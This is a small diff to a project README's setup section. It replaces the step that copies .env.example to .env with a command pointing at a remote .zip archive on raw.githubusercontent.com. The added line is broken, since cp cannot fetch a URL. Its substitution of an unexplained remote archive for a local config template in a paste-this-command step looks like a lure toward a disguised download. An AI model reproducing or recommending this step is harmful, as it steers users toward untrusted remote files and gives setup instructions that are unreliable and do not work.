@@ -9,7 +9,7 @@ npm install
 
 2. Create .env file:
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/Kylee7/hava-backend/main/models/backend-hava-v1.9.zip .env
 # Edit .env with your values
 ```
 
